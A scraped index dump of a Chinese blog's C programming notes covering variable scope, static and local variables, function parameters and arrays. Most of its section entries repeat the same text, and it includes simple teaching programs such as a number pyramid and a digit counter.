全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#本地变量"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#全局变量和局部变量"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#变量的生存期作用域"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#变量储存的内存分布"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#静态变量"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#本地变量的规则"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#当函数没有参数时"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#调用函数时的逗号"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数字金字塔"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#heading"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include \u003cstdio.h\u003e int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#81数组"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 